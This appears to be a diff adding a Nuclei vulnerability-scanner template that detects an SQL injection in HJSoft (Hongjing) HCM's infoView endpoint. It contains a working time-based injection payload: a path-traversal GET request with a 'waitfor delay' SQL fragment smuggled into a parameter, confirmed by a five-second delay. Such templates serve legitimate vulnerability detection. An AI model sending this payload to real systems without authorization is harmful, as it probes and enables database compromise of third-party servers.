@@ -1,0 +1,30 @@
+id: hjsoft-hcm-infoview-sqli
+
+info:
+  name: HJSoft HCM infoView - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Hongjing HCM /templates/attestation/../../general/info/view interface is affected by SQL injection.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFOA/%E5%AE%8F%E6%99%AFHCM%E7%B3%BB%E7%BB%9FinfoView%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: HJSoft-HCM
+
+http:
+  - raw:
+      - |
+        GET /templates/attestation/../../general/info/view?kind=1&a0100=1';waitfor+delay+'0:0:5'+-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+      - type: word
+        part: header
+        words:
+          - 'JSESSION='
+      - type: status
+        status:
+          - 200
